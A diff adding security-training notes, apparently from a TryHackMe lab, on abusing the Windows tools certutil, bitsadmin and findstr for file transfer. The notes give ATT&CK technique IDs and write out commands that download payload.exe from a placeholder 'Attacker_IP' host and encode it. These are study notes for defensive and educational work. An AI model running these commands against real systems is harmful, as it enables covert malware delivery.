@@ -42,3 +42,26 @@ https://lolbas-project.github.io/
 
 File Operations
 
+Certutil:
+built-in utility for managing certification services
+-used to dump and display Certification Authority (CA)
+-can encode and transfer files unrelated to certification - Ingress Tool Transfer (T1105)
+-using split technique download file from URL
+certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+-used for eecoding
+C:\Users\thm> certutil -encode payload.exe Encoded-payload.txt
+
+BITSAdmin:
+sys admin utility that can be used to create, download, or upload BITS (background intelligent transfer service)
+-low-bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers
+-abused to download and execute malicious payload (T1197)
+C:\Users\thm>bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+
+FindStr:
+find text and string patterns in files
+-can be used to download remote files from SMB shared folders
+C:\Users\thm>findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
+
+bitsadmin /transfer /Download /priority Foregraound http://[IP]/file
+enc_thm_0ymFiOG_file.txt
+
